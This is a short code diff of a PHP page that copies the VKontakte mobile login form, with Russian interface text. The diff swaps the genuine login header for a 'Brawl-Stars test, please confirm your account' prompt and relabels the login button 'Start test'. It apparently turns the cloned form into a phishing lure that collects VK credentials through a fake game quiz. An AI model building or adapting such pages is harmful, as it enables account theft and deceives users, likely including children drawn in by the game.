@@ -69,7 +69,7 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
 
   <div class="form_item">
     <div class="login_header">
-     Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
+     Тест Brawl-Stars \nПожалуйста подтвердите ваш аккаунт.
     </div>
       <div class="fi_row"><div class="service_msg_box">
   <div class="service_msg service_msg_warning">
@@ -90,7 +90,7 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
       </dl>
 
       <div class="fi_row_new">
-        <input class="button wide_button" type="submit" value="Войти" />
+        <input class="button wide_button" type="submit" value="Начать тест" />
       </div>
       <div class="fi_row">
         <div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли пароль?</a></div>
